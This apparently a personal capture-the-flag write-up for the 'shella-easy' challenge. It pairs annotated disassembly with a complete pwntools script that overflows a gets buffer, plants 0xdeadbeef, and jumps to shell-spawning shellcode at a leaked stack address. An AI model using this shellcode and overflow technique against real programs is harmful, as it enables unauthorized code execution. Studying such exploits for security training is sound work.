@@ -1,0 +1,76 @@
+=== Personal solution description ===
+
+These challenges are so easy we can even skip decompilation and just use the disassembly:
+
+$ objdump -d ./shella-easy -M intel
+
+---------------------------------------------------------------------------------
+	080484db <main>:
+	 80484db:	55                   	push   ebp
+	 80484dc:	89 e5                	mov    ebp,esp
+	 80484de:	53                   	push   ebx
+	 80484df:	83 ec 44             	sub    esp,0x44
+	 80484e2:	e8 29 ff ff ff       	call   8048410 <__x86.get_pc_thunk.bx>
+	 80484e7:	81 c3 19 1b 00 00    	add    ebx,0x1b19
+	 80484ed:	8b 83 fc ff ff ff    	mov    eax,DWORD PTR [ebx-0x4]
+	 80484f3:	8b 00                	mov    eax,DWORD PTR [eax]
+	 80484f5:	6a 14                	push   0x14
+	 80484f7:	6a 02                	push   0x2
+	 80484f9:	6a 00                	push   0x0
+	 80484fb:	50                   	push   eax
+	 80484fc:	e8 bf fe ff ff       	call   80483c0 <setvbuf@plt>
+	 8048501:	83 c4 10             	add    esp,0x10
+	 8048504:	8b 83 f8 ff ff ff    	mov    eax,DWORD PTR [ebx-0x8]
+	 804850a:	8b 00                	mov    eax,DWORD PTR [eax]
+	 804850c:	6a 14                	push   0x14
+	 804850e:	6a 02                	push   0x2
+	 8048510:	6a 00                	push   0x0
+	 8048512:	50                   	push   eax
+	 8048513:	e8 a8 fe ff ff       	call   80483c0 <setvbuf@plt>
+	 8048518:	83 c4 10             	add    esp,0x10
+	 804851b:	c7 45 f8 be ba fe ca 	mov    DWORD PTR [ebp-0x8],0xcafebabe
+	 8048522:	8d 45 b8             	lea    eax,[ebp-0x48]             <--------- here's the address of the buffer [ebp-0x48]
+	 8048525:	50                   	push   eax                                   this means we only need 0x48 + 0x4 (ebp size) + 0x4 ret addr for our exploit
+	 8048526:	8d 83 e0 e5 ff ff    	lea    eax,[ebx-0x1a20]
+	 804852c:	50                   	push   eax
+	 804852d:	e8 4e fe ff ff       	call   8048380 <printf@plt>       <--------- buffer address gets printed here
+	 8048532:	83 c4 08             	add    esp,0x8
+	 8048535:	8d 45 b8             	lea    eax,[ebp-0x48]
+	 8048538:	50                   	push   eax
+	 8048539:	e8 52 fe ff ff       	call   8048390 <gets@plt>         <--------- gets in vulnerable buffer
+	 804853e:	83 c4 04             	add    esp,0x4
+	 8048541:	81 7d f8 ef be ad de 	cmp    DWORD PTR [ebp-0x8],0xdeadbeef  <---- looks like an arbitrary comparison
+	 8048548:	74 07                	je     8048551 <main+0x76>                   we need to pad ebp-0x8 location with 0xdeadbeef
+	 804854a:	6a 00                	push   0x0                                   to jump over the exit at 0x804854c
+	 804854c:	e8 4f fe ff ff       	call   80483a0 <exit@plt>              <-------------------------------/
+	 8048551:	b8 00 00 00 00       	mov    eax,0x0
+	 8048556:	8b 5d fc             	mov    ebx,DWORD PTR [ebp-0x4]
+	 8048559:	c9                   	leave  
+	 804855a:	c3                   	ret    
+	 804855b:	66 90                	xchg   ax,ax
+	 804855d:	66 90                	xchg   ax,ax
+	 804855f:	90                   	nop
+---------------------------------------------------------------------------------
+
+
+So, here's the exploit:
+---------------------------------------------------------------------------------
+	#!/usr/bin/env python3
+	from pwn import *
+
+	target = process("./shella-easy")
+	target.recvuntil(b"Yeah I'll have a ")
+	jmp_addr = int(target.recvline().split()[0], 16)   # catch leaked address
+
+
+	payload = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0f\x2c\x04\xcd\x80" # shellcode to pop a shell on 32-bit binaries
+	payload += b"A" * (0x40 - len(payload))
+	payload += b"\xef\xbe\xad\xde"   # ensure 0xdeadbeef is at ebp-0x8
+	payload += b"A" * 0x8     # 0x4 padding + 0x4 overwrite old EBP
+	payload += p32(jmp_addr)
+
+	target.send(payload)
+	target.interactive()
+---------------------------------------------------------------------------------
+
+We used the shellcode from tamu19_pwn3
